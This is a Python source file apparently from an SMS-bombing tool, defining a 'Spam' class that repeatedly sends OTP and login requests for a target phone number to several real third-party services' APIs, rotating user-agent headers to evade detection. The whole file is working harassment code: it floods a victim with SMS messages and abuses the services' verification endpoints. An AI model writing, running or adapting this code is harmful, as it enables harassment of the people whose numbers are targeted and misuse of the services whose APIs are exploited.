"""
 Copyright (c) 2022 GNU GENERAL PUBLIC

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.
 """

import random
import requests
import time
from helper import printer, timer
from utils.randomuser import users


class Spam:
    """
    Spams the given number with the given count and throttle.

    US numbers only.

    :param number: The number to spam.
    :param count: The number of times to spam.
    :param throttle: The time interval between each spam.
    """
    @timer.timer
    def __init__(self, number, count, throttle):
        url = ["https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20" + number,
               "https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" + str(91) + "&nod=4&phone=" + number,
               "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + number,
               "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + number]
        session = requests.session()
        session.headers = random.choice(users)
        req = session.post(random.choice(url))

        if req.status_code != 200:
            printer.error(f"Error : {req.status_code}")

        for i in range(int(count) + 1):
            try:
                req = session.post(random.choice(url))
                time.sleep(int(throttle))
                if req.status_code == 200:
                    printer.success(f"sent {i + 1} sms to '{number}'")
            except Exception as e:
                printer.error(f"Error : {e}")
                pass
